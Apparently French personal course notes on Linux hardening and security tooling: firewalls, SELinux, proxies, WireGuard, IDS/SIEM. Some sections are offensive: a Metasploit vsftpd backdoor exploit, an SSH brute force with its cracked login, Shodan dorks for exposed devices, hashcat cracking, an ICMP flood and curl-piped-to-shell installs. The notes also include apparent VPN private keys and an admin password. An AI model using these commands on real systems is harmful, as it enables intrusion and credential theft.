+-----------------------------------------+
| Affichage fichier sans ses commentaires |
+-----------------------------------------+
	$ grep -Ev '^$|^#'

+--------------------+
| Etape 1 de la conf |
+--------------------+
	blinder le port NTP (123) qui permet à un attaquant de lister les machines connectées sur le réseau
	Utiliser passwd pour définir un mdp

	nmap cheat sheet : https://www.stationx.net/nmap-cheat-sheet/
	tryhackme.com
	book.hacktricks.xyz
	https://hackmd.io/kHFoiS5HSHKRdV7az960TQ

	Sécuriser un linux peut passer par une mise en place de droits 0740 sur /etc/sudoers avec seul l'admin concerné y étant inscrit

+-------------------+
| Gestion du réseau |
+-------------------|
	SI IFCONFIG OU NETSTAT N'EST PAS INSTALLÉ, NE PAS LES INSTALLER ILS SONT DÉPRÉCIÉS
	ifconfig = ip
	netstat = ss

+----------+
| Pare-feu |
+----------+
	iptables EST le pare-feu
	ufw est une interface user-friendly pour iptables
	
	$ ufw --help
		Affiche les paramètres de la commande
	$ ufw enable
		Le pare-feu est actif et lancé au démarrage du système
		AUCUNE POLICY PAR DEFAUT : AUTORISE TOUTE CONNEXION
	$ ufw disable
		Le pare-feu est arrêté et désactivé lors du démarrage du système
	$ vim /etc/default/ufw
		Configuration du pare-feu
		TOUTE MODIFICATION DEMANDE UN REDÉMARRAGE DU FIREWALL POUR PRISE EN COMPTE
	$ grep -Ev '^$|^#' /etc/default/ufw
		Affiche les paramètres. Voici les paramètres par défaut
		
		IPV6=yes
		DEFAULT_INPUT_POLICY="DROP"
		DEFAULT_OUTPUT_POLICY="ACCEPT"
		DEFAULT_FORWARD_POLICY="DROP"
		DEFAULT_APPLICATION_POLICY="SKIP"
		MANAGE_BUILTINS=no
		IPT_SYSCTL=/etc/ufw/sysctl.conf
		IPT_MODULES=""
	$ ufw allow ssh
		Autorise le SSH
	$ ufw status
		Voici la sortie console après autorisation du SSH (port 22)
		
		État : actif
		Vers                       Action      De
		----                       ------      --
		22/tcp                     ALLOW       Anywhere                  
		22/tcp (v6)                ALLOW       Anywhere (v6) 	
		
+-------------+
| SUDO / DOAS |
+-------------+
	$ visudo
		Affiche la configuration de sudo
	$ doas -u root visudo
		Affiche la configuration de doas
	Installer doas
		$ apt install plocate
		
		$ apt install doas
		$ vi 

+-----------------------+
| Définition d'une PSSI |
+-----------------------+
	Roue de Deming
	P : Plan : Planifie une nouvelle action
	D : Do : Réalise l'action
	C : Check : Contrôle son efficacité
	A : Action : Réalise son efficacité

Une politique de sécurité du système d'information se décompose en 3 documents distincts :
- La Politique de Sécurité Informatique
	doc principal, définit rôles et responsabilités, objectifs et mesures de protection à mettre en place, mesures de sécurité à appliquer pour protéger les systèmes et données. Il n'a que peu de restrictions de sécurité
- Les Normes de Sécurité Informatique
	Fournissent des détails spécifiques sur les mesures de sécurité à mettre en place.
	Peuvent inclure des politiques de gestion de mots de passe, contrôles d'accès, sauvegardes, plans de continuité des activités etc
- Les Procédures de sécurité informatique
	Fournissent des instructions détaillées sur les procédures à suivre pour mettre en place les mesures décrites dans les 2 premiers documents
	- informatique générale
		politique de base (mots de passen, règles d'accès, sauvegarde, récupération, mesures de sécurité physiques
	- réseau
		gestion des réseaux, pare-feux, détection d'intrusion et surveillance des réseaux
	- applications
		codage sécurisé, gestion des accès, procédures de test et d'évaluation
	- données
		confidentialité, classification des données, stockage et transmission des données, protection de la vie privée
	- conformité
		protection des données personnelles, confidentialité des données, transactions électroniques...

+------------------------+
| Application d'une PSSI |
+------------------------+
	$ vim /etc/login.defs	

+---------------------------------------------------------+
| Mise à jour des firmware des composants de l'ordinateur |
+---------------------------------------------------------+
	LVFS (Linux Vendor Firmware Service)
	$ fwupdmgr get-devices
	$ fwupdmgr get-updates
	$ fwupdmgr update
	$ fwupdmgr security --force

+---------------------+
| Choix du bootloader |
+---------------------+
	Grub embarque un linux complet
	systemd-boot est beaucoup plus spartiate mais n'embarque pas ce système et est donc plus sécurisé.

+---------------------------------------+
| Check des failles Spectre et Meltdown |
+---------------------------------------+
	$ spectre-meltdown-checker
	Désactiver les correctifs demandent de remettre un ancien firmware CPU, c'est une lourde opération

+---------------------------------------------------+
| Paramétrage du kernel 			    |
| Sélection des modules et paramétrage des tunables |
+---------------------------------------------------+
	
- $ vim /boot/config-5.19.0-32-generic pour être BIEN BIEN bourrin
- On peut utiliser l'utilitaire kconfig-hardened-check
	https://github.com/a13xp0p0v/kconfig-hardened-check
	On clone le dépôt et on utilise le script depuis le répertoire
	$ ./bin/kconfig-hardened-check -c /boot/config-5.1[...(9.0-32-generic)] (on utilise la tabulation pour trouver le fichier de configuration du noyau le plus récent)
		Permet de checker la configuration du kernel
- Un outil permet de surveiller dynamiquement le comportement du kernel, il s'agit de LKRG
(Kernel Runtime Integrity Checking)
- On peut le configurer sans avoir à le recompiler. Il suffit de mettre un fichier type /etc/modprobe.d/*.conf et d'y mettre les lignes pour interdire les modules à y charger.
- On peut modifier dans le bootloader des paramètres du kernel
- On peut modifier le sysctl.conf
	$ cd /etc/sysctl.d
	$ ls
	(identifier la ou les lignes avec sysctl.conf)
	$ vim 99-sysctl.conf (et eventuellement les autres)
	On peut y désactiver l'IPv6 par exemple

+------+
| Logs |
+------+
$ journalctl affiche tous les messages depuis le dernier
$ journalctl -b affiche depuis le dernier boot
$ journalctl --list-boots liste les démarrages

+---------------+
| Paquet Debian |
+---------------+
Il y a 4 fichiers à préparer : preinst, postinst, prerm, postrm pour avant/après install et avant/après suppression. On y place de la création d'utilisateurs ou la liste des dépendances par exemple

+------------------+
| Repository local |
+------------------+
apt-cacher-ng est un serveur de cache de paquet pour mettre à jour des serveurs sans accès à Internet

+---------------------------------------------------------+
| Vérification de la configuration du fichier /etc/shadow |
+---------------------------------------------------------+
	$ pwck

+-----------+
| Veracrypt |
+-----------+
Logiciel de chiffrement de partition
	https://www.veracrypt.fr/en/Downloads.html
	$ dpkg -i veracrypt-1.25.9-Ubuntu-22.04-amd64.deb

+---------+
| SELinux |
+---------+
Implémente le modèle de Controle d'Accès Obligatoire (Mandatory Access Control, MAC)
	$ selinux-activate
		Active SELinux que sur un système ne l'ayant pas par défaut. Son activation ne nécessite pas de redémarrage.
	$ sestatus
		Donne les informations relatives à SELinux
	$ getenforce
		Donne le statut d'activation de SELinux
	$ setenforce
		Définit le statut d'activation de SELinux

+------------------------------------------------------------+
| Utilitaire permettant de détecter la présence d'un rootkit |
+------------------------------------------------------------+
ATTENTION CES UTILITAIRES SE DÉTECTENT ENTRE EUX, DÉSINSTALLER APRÈS USAGE SI MULTIPLES OUTILS

$ apt install chkrootkit
$ chkrootkit
http://www.chkrootkit.org/

$ apt install rkhunter
$ rkhunter -c --rwo

+-----------+
| Antivirus |
+-----------+
ClamAv
Il s'installe avec :
	$ apt install clamav
Il se vérifie avec :
	$ clamscan --version
Il y a un gestionnaire de mise à jour des bases de données virales :
	$ apt install clamav-cvdupdate
Il s'utilise avec : 
	$ cvdupdate serve
On vérifie le statut de l'antivirus avec :
	$ systemctl status clamav-freshclam -l
On alance un scan avec :
	$ clamscan --infected --remove --recursive /home

+-----------+
| DevSecOps |
+-----------+
Utilitaire permettant d'identifier des CVE pour telle librairie utilisée dans le dev
Il est compatible avec différents langages et notamment Maven !
https://github.com/google/osv-scanner
https://google.github.io/osv-scanner/

On prend l'exemple du dépôt Git open-source filebrowser
	$ git clone https://github.com/filebrowser/filebrowser

Osv-Scanner s'installe avec
	$ apt install golang-go locate (locate pour ce qui va suivre)
	$ go install github.com/google/osv-scanner/cmd/osv-scanner@v1
Il va s'installer dans le répertoire personnel de l'utilisateur ayant exécuté la commande
Pour le trouver :
	$ updatedb
	$ locate osv-scanner
Une fois trouvé, on ouvre son dossier
	$ cd /root/go/bin/
Voici la commande à exécuter pour le lancer
	$ ./osv-scanner -r /home/administrateur/Bureau/filebrowser/
| OSV URL (ID IN BOLD)                │ ECOSYSTEM │ PACKAGE              │ VERSION │ 
│ https://osv.dev/GHSA-93q8-gq69-wqmw │ npm       │ ansi-regex           │ 3.0.0   │
│ https://osv.dev/GHSA-93q8-gq69-wqmw │ npm       │ ansi-regex           │ 4.1.0   │
│ https://osv.dev/GHSA-93q8-gq69-wqmw │ npm       │ ansi-regex           │ 5.0.0   │

On commence par lire la colonne "PACKAGE", sa "VERSION" est obsolète, cf "OSV URL" cliquable donnant la bonne version à installer.

+------+
| nmap |
+------+
	-v permet plus de clarté
	-p- permet de taper sur TOUS les ports

$ nmap -sS 10.20.30.72 -v affiche les 1000 premiers ports les plus utilisés en protocole TCP
	On peut commencer à attaquer mais avec les conf par défaut, ça revient à tester tout et n'importe quoi

$ nmap -sS -p- 10.20.30.72 -v
	Scanne TOUS les ports de la machine en TCP
	Un malware ouvre très généralement son port au-delà de 10000. Tout port au-delà de 10000 est suspect

$ nmap -sX 10.20.30.72 -v
$ scan Xmas

$ nmap -sS -sV 10.20.30.72
	Fait le scan et affiche la version de certains services qui écoutent le port
	Il va donc envoyer une requête spécifique pour demander la version du service
	Si le logiciel n'est pas à jour, une cve et un poc et on entre

$ nmap -O 10.20.30.72
	Donne l'OS cible
	Si ça donne VirtualBox au lieu de Linux, il y a des techniques pour aller plus loin

	Commande purement défensive mais TRES bruyante et TRES longue
$ nmap -sS -O -sV -T4 -p- -sC --script vuln -v 10.20.30.72
	-sS affiche les ports
	-O l'OS
	-sV la version des services
	-T4 limite la durée du scan
	-p- tape partout
	--script vuln va associer des CVE aux versions issues de -sV

+--------+
| Shodan |
+--------+
$ ping site.com donne l'ip
https://www.shodan.io/host/42.53.76.31 affiche les infos du serveur derrière l'ip
webcamxp 5 country:"FR"
cisco no pass
hp laserjet port:"8081"

+----------+
| USBGuard |
+----------+
Permet de bloquer les ports usb sous linux
	$ apt install usbguard
	$ systemctl status usbguard le donne "inactif" après install
	$ usbguard generate-policy > /etc/usbguard/rules.conf
	$ systemctl start usbguard
	$ systemctl enable usbguard
	$ usbguard list-devices
	$ usbguard allow-device 5
	$ usbguard block-device 5

+------------+
| Metasploit |
+------------+
	Dans Kali, ouvrir une console avec msfconsole
	$ search vsftp
	$ use exploit/unix/ftp/vsftpd_234_backdoor
	$ show options
	$ set RHOSTS 10.20.30.72
	$ run
	ATTENTION : le $ ou le # n'est pas affiché

	$ use auxiliary/scanner/ssh/sshlogin
	$ show options
	$ set pass_file /usr/share/wordlists/metasploit/http_default_pass.txt
	$ set user_file /usr/share/wordlists/metasploit/http_default_users.txt
	$ set rhosts 10.20.30.72
	$ run
	Starting bruteforce
	[+] 10.20.30.72:22 - Success: 'user:user' 'uid=1001(user) gid=1001(user) groups=1001(user)
	[*] Scanned 1 of 1 hosts (100% complete)
	[*] Auxiliary module execution completed
	$ ssh user@10.20.30.72

+-----------------+
| Gestion des mdp |
+-----------------+
	$ passwd [options] [user]
	$ passwd -m15 -m30 user1 définit une durée minimale de mdp à 15j et maximale à 30j pour user1
	+- Vérifier que les mdp dans /etc/passwd et /etc/shadow soient hachés, non en clair
	+- Vérifier l’activation de l’authentification par mots de passe "shadow"
	édition du fichier etc/passwd, le 2ème champ doit contenir "x" pour tous les comptes (confirme l’activation de l’authentification par /etc/shadow)
	+- si le fichier "shadow" est non utilisé, la commande pwconv convertit le fichier /etc/passwd en /etc/shadow
	+- vérification du remplissage du 2ème champ fichier /etc/shadow (sinon des comptes sans mot de passe existent)
	+- blocage du changement de mot de passe non "shadow"
	+- utilisation de PAM pour forcer la création de mots de passe solides
	+- limitation de la durée de vie et autres options des mots de passe et comptes utilisateurs : durée de vie < temps nécessaire au craquage
	+- interdiction de connexion directe pour le compte "root local", fichier /etc/securetty vide, seul sera utilisé le changement d'identité par su root

	désactivation de l'accès openssh pour le compte root
	+- spécification des utilisateurs autorisés à utiliser la commande "su"

+---------+
| sudo -l |
+---------+
	+- permet d'afficher les droits d'élévation pour l'user courant

+---------+
| linPEAS |
+---------+
Il y a différents PEAS (linPEAS, winPEAS)
C'est un script à exécuter sur un serveur pour en obtenir des informations.
Il recherche essentiellement des problèmes de configuration système pouvant mener à de l'élévation de privilèges
Plus la couleur est aggressive sur un fond aggressif, plus il s'agit d'un problème grave pouvant entraîner une porte d'entrée :
	RED/YELLOW: 95% a PE vector
	RED: You should take a look to it
	LightCyan: Users with console
	Blue: Users without console & mounted devs
	Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
	LightMagenta: Your username
Ca fait le tour de l'OS complet en levant des éventuelles sources de problème
Il devrait être exécuté régulièrement sur les serveurs de production
Il pourrait être interéssant de placer la sortie dans un journal et comparer les diff entre 2 exécutions.

$ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

+-------+
| Lynis |
+-------+
$ apt install lynis
$ lynis audit system
Script qui vérifie les configurations des logiciels et services installés
En bas du rapport, il propose des solutions correctives avec des liens

+----------+
| CheckSec |
+----------+
Vérifie les mesures de sécurité prises sur les fichiers exécutables
$ apt install checksec

+-------+
| Proxy |
+-------+
cacher-ng est un proxy
squid-cache aussi
Un proxy est un mandataire qui effectue une action déléquée de chez moi vers l'extérieur
Un reverse-proxy est un mandataire qui effectue une action déléguée de l'extérieur vers chez moi

Un proxy sert de cache, de filtrage de contenu (liste noire/blanche), de pare-feu, de filtre de connexion. On peut changer toute la requête comme le User-Agent par exemple.
Il faut régulièrement purger le cache du proxy.
Rupture de flux : le proxy déchiffre le paquet pour vérifier le contenu puis rechiffre le paquet. Cela est possible puisque l'échange des clés est réalisé : le proxy (pare-feu) dispose des clés de chez moi et de l'extérieur.

Un reverse-proxy sert à présenter une ressource. On peut alors présenter une page en cache ou filtrer/limiter les connexions

$ apt install squid
$ cp squid.conf squid.conf.backup
$ grep -Ev '^$|^#' squid.conf.backup > squid.conf
	On enlève les lignes vides et les lignes commençant par un #
Dans ce fichier de conf, on définit les ports interdits et autorisés, on oblige le CONNECT sur le port 443 seul, on autorise le manager à se connecter en localhost et nulle part ailleurs, on configure le cache et son délai entre les rafraîchissements
Pour ajouter dans la conf un groupe de machines à se connecter à mon serveur :
	$ vim /etc/squid/squid.conf
		acl local_clients src 10.20.0.0/16
		http_access allow local_clients
Pour retirer des paramètres du header :
	$ vim /etc/squid/squid.conf
		request_header_access User-Agent deny all
		request_header_access Via deny all
		request_header_access X-Forwarded-For deny all
$ squid -k check
	C'est un linter pour vérifier la cohérence du fichier de configuration.
	Il en existe d'autres pour d'autres logiciels y compris apache :
		https://github.com/jchampio/linter-apache-configtest
$ systemctl restart squid
$ systemctl status squid
Je configure Firefox pour utiliser mon proxy :
	- Configuration manuelle du proxy
		Proxy HTTP 127.0.0.1
		Port 3128 (défini dans etc/squid/squif.conf)
http://dsi.ut-capitole.fr/hidden/test/
Ce site est un miroir renvoyant les informations qu'on lui a envoyé.
On peut l'utiliser pour voir si notre proxy fonctionne.

$ apt install squidguard
	Pour que squid soit conscient de la présence de squidguard il faut ajouter une ligne dans la conf de squid.
		$ vim /etc/squid/squid.conf
			url_rewrite_program /usr/bin/squidGuard
		$ vim /etc/squidguard/squidGuard.conf
			On définit les listes de sites autorisés et interdits et les redirections
	Configurer squid et squidguard est long
	Vérifier si un script Ansible existe pour automatiser le déploiement d'un poroxy bien configuré.

+--------+
| Miroir |
+--------+
http://dsi.ut-capitole.fr/hidden/test/
Ce site est un miroir renvoyant les informations qu'on lui a envoyé.
On peut l'utiliser pour voir si notre proxy fonctionne.

+------------------------+
| Web-App Firewall (WAF) |
+------------------------+
modsecurity est un module pour Apache et nginx qui est un pare-feu applicatif.
Il est à installer en plus d'Apache, il ne l'est pas par défaut.
Il a besoin de Core Rule Set, un ensemble de règles affinées par l'expérience. C'est l'OWASP qui le gère, à trouver sur coreruleset.org

+---------------------+
| Certificats SSL/TLS |
+---------------------+
Let's Encrypt utilise le protocole ACME pour délivrer les certificats
On peut utiliser certbot et le mettre dans un crontab pour qu'il demande régulièrement de renouveler le certificat et facilite la configuration en automatisant la vérification des domaines et la délivrance des certificats

SSL-config est un outil fourni par mozilla pour simplifier la configuration du certificat.

SSL-Labs permet d'analyser la configuration d'un serveur web. Il va plus loin que la vérification du certificat.
Vérifier les algorithmes de chiffrement que le serveur propose et enlever ceux trop faibles. Cela peut entraîner une perte de compatibilité avec certains navigateurs et équipements anciens.

+---------------------------------------------------+
| Attaquer le contenu des répertoires d'un site web |
+---------------------------------------------------+
3 outils concourent à ce but :
DirStalk, le plus récent, à prendre s'il faut en choisir un seul
Dirb
DirBuster

+---------------------------------+
| Configuration d'un serveur mail |
+---------------------------------+
Configuration de DNS et SPF, utilisation de SSL/TLS, configuration des ports de messagerie (les ports SMTP, POP et IMAP doivent n'accepter que les connexions depuis les adresses IP autorisées), pare-feu (bloquer les connexions entrantes non sécurisées), surveillance des journaux, mise à jour régulière, filtres anti-spam, DKIM et DMARC (détection des courriels falsifiés), logiciels anti-virus et anti-malware
Utiliser au moins un MTA (Mail Transfer Agent) qui va filtrer les mails entrants avec les filtres milter pour éliminer les mails pour soulager le serveur de mail

+-----+
| FTP |
+-----+
Ne JAMAIS utiliser FTP ou RDP, utiliser SFTP à minima

+------+
| Hash |
+------+
$ hashcat 7ecc19e1a0be36ba2c6f05d06b5d3058 -m 0 -O /usr/share/wordlists/rockyou.txt

+----------+
| iptables |
+----------+
	+- Pour voir les règles des chaînes de la table FILTER, avec le port concerné
$ iptables -L -v
	-A précise la table
	-p précise le protocole
	-j précise l'action
$ iptables -A INPUT -p tcp -m multiport --dport 22,80,443 -j DROP
$ iptables -A OUTPUT -p tcp -m multiport --dport 22,80,443 -j DROP
	+- blinder le port NTP (123) qui permet à un attaquant de lister les machines connectées sur le réseau
$ iptables -A INPUT -p tcp --dport 123 -j DROP
$ iptables -A OUTPUT -p tcp --sport 123 -j DROP
	+- Pour créer une chaîne "SSH" qui contient toutes les règles SSH
$ iptables -N SSH
$ iptables -A INPUT -j SSH
	+- Pour vérifier l'action
$ nmap -Pn 10.20.30.72
	+-  Pour voir les ports filtrés distants
$ nmap -sA 10.20.30.72
	+- limiter le SSH à une seule IP connue
$ iptables -A SSH -p tcp -s 10.20.30.72 -j ACCEPT
	+- limiter tous les protocoles à cette IP
$ iptables -A SSH -p all -s 10.20.30.72 -j ACCEPT
	Pour loguer les connections entrantes
$ iptables -P INPUT DROP
$ iptables -A INPUT -j LOG --log-prefix 'connection dropped :'
	Les logs sont dans /var/log/messages
$ tail -f /var/log/messages pour voir en temps réel le fichier
	+- Limiter le flooding ICMP
$ iptables -a INPUT -p icmp -m limit --limit 1/s --limit-burst 1 -j ACCEPT
	+- loguer ce qui passe mais surtout pas ce qui a été refusé pour éviter une surcharge des logs en cas de flooding
$ iptables -a INPUT -p icmp -m limit --limit 1/s --limit-burst 1 -j LOG --log-prefix 'ICMP 1/s accepté :'
	+- générer du flooding icmp
$ hping3 -1 --flood 10.20.30.72
	+- sauvegarde et restauration iptables
$ iptables-save > default-iptables.txt
$ iptables-restore < default-iptables.txt

+----------------------+
| Scripts au démarrage |
+----------------------+
1. On met un script dans /etc/update-motd.d
2. On peut créer un service puis l'enable
		On va dans /etc/systemd/system
		On crée un .service
		Contenu d'un service :
	[Unit]
	Description="info system"

	[Service]
	Type=simple
	ExecStart=/home/user/Documents/test1.sh

	[Install]
	WantedBy=multi-user.target
		Contenu du script :
	#!/bin/bash

	echo "-DATE: $(date +'%a %b %d %H:%HM:%S %Z %Y')"
		Le test1.sh doit avoir les droits d'exécution, chmod 755


+------------------+
| AlienVault OSSIM |
+------------------+
Il faut un serveur et un sensor
Les deux sont sur le réseau privé hôte
Le sensor a un 2eme adapter réseau, réseau privé hôte toujours, promiscuité allow all
séparer les ip mais les placer dans le créneau du réseau hôte, voir dans le "gestionnaire de réseau hôte de VirtualBox"
Il permet de déployer HIDS sur des serveurs, une fois fait il donne un dashboard où il affiche des alertes
Nikto, fourni, permet de scanner les potentielles vulnérabilités d'un service Web

+----------------------+
| Liste des CVE propre |
+----------------------+
https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=vim

------------------------------------------------------------------------+
| OpenCTI, partager la connaissance cyber avec les autres organisations |
------------------------------------------------------------------------+
https://github.com/OpenCTI-Platform/opencti

+---------------------+
| Daemons et serveurs |
+---------------------+
Un daemon est un service qui tourne en arrière-plan de manière autonome sans intervention de l'utilisateur 
Un serveur écoute un port réseau et réagit en fonction des requêtes

+-----------------------+
| Installation d'un VPN |
+-----------------------+

Installation des packets côté clients :
	$ apt install wireguard
Installation des packets côté serveur CentOS/Rocky :
	$ yum update
	$ yum install elrepo-release epel-release
	$ yum install wireguard-tools
Pour les clients et serveur :
	$ cd /etc/wireguard
	$ wg genkey | tee privatekey | wg pubkey > publickey
	$ chmod go= /etc/wireguard/p*
Configuration côté clients :
	$ vim /etc/sysctl.d/wg.conf
		Créer le fichier et ajouter la ligne
		net.ipv4.ip_forward=1
	$ sysctl -p /etc/sysctl.d/wg.conf
		Applique les modifications dans le kernel
	$ vim /etc/wireguard/wg.conf
		[Interface]
		Address = 192.168.10.12/24
		ListenPort = 51820

		PrivateKey = EGNzjR0JXoYX8pmdBKIB1OCnnZY5Aac8LzcauSMe+0s=

		[Peer]
		EndPoint = 192.168.10.11:51820
		PublicKey = /4wCK66Xoe4RQUAA2c+kjYr5QnYthGvteYQBWENOuTA=
		AllowedIPs = 192.168.10.0/24, 10.0.10.0/24
Configuration côté serveur :
	$ vim /etc/wireguard/wg.conf
		[Interface]
		Address = 192.168.10.11/24
		ListenPort = 51820

		PrivateKey = eJgjBwmb1wRe8aDCPRPf6sB2b9l9LyjqmZnuBXDGO2c=

		[Peer]
		PublicKey = llgRMNIu1n18mBvx8sPYy7+FK6ddhdCn7uqfj3Hajlg=
		AllowedIPs = 192.168.10.12/32
Démarrage du VPN pour les clients et serveur :
	$ wg-quick up wg
		(wg est le nom du fichier .conf)
Vérification de la configuration côté client :
	$ wg
	$ ping 192.168.10.12
Vérification de la configuration côté serveur :
	$ wg
	$ ping 192.168.10.11
Automatisation du démarrage côté serveur
	$ systemctl enable wg-quick@wg


+------------------------+
| Audit, logs, messaging |
+------------------------+
Auditd
	$ apt install auditd
	$ aureport
dmesg
	$ dmesg

+----------------------------------------+
| Installation de l'IDS SELKS par Docker |
+----------------------------------------+
SELKS contient un ELK et l'IDPS/NSM Suricata.
Il propose l'installation de portainer qui facilite la gestion de Docker
	$ git clone https://github.com/StamusNetworks/SELKS
	$ cd SELKS/docker
	$ apt install docker.io
	$ ./easy-setup.sh
		Accepter l'installation de Portainer et sélectionner toutes les connexions en les tapant une à une séparées par des espaces
		Définir un mot de passe pour Portainer depuis son interface d'administration
	$ docker ps
		Affiche la liste des containers
	$ docker restart [nom_du_container]
		$ docker restart portainer
	$ docker-compose up -d
Se connecter à Portainer depuis http://localhost:9443 avec le compte créé
Se connecter à Scirius depuis http://localhost avec le couple selks-user:selks-user
Se connecter à Suricata depuis https://localhost/suricata/ sans compte
Se connecter à Cyberchef depuis https://localhost/static/cyberchef/ sans compte

+------+
| SIEM |
+------+
Un SIEM est un outil de sécurité informatique pour collecter, analyser et corréler les données provenant de différentes sources
journaux, flux de réseau, alertes de sécurité, informations sur les vulnérabilités...
Le SIEM analyse ces données, peut fournit des fonctions de surveillance en temps réel , d'alerte et de reporting

+------------------------+
| File Integrity MAnager |
+------------------------+
Il est conçu pour surveiller l'intégrité des fichiers
Il utilise du hachage au démarrage du système et un contrôle des droits d'accès

AIDE, WAZUH, SAMHAIN, BELTANE, AFICK

+----------------------+
| Dépôts Github sympas |
+----------------------+
GCHQ
	https://github.com/orgs/gchq/repositories
ANSSI
	https://github.com/ANSSI-FR

+---------------------------------+
| Sondes de détection d'intrusion |
+---------------------------------+
Fail2ban, sshguard, denyhosts

Fail2ban
	$ apt install fail2ban
	$ systemctl start fail2ban
	$ systemctl enable fail2ban
		La conf est dans /etc/fail2ban
		Ne rien toucher, juste surcharger la conf dans /etc/fail2ban/jail.d
	$ fail2ban-client status

+-------+
| Wazuh |
+-------+
https://documentation.wazuh.com/current/quickstart.html

Si docker est lancé
	$ docker stop [process]
	ou
	$ systemctl stop docker
	$ systemctl disable docker
	
	$ curl -sO https://packages.wazuh.com/4.3/wazuh-install.sh && sudo bash ./wazuh-install.sh -a
		User: admin Password: IESVBHWccsH?t8vQi0yl3*mzfEHd?*sS
	$ curl -so wazuh-agent-4.3.10.deb https://packages.wazuh.com/4.x/apt/pool/main/w/wazuh-agent/wazuh-agent_4.3.10-1_amd64.deb
	$ systemctl start wazuh-manager
	$ systemctl enable wazuh-manager
+-----+
| Git |
+-----+
git config --global alias.adog "log --all --decorate --graph --pretty='%Cred%h%Creset -%C(auto)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset'"
	Permet de faire l'alias tree
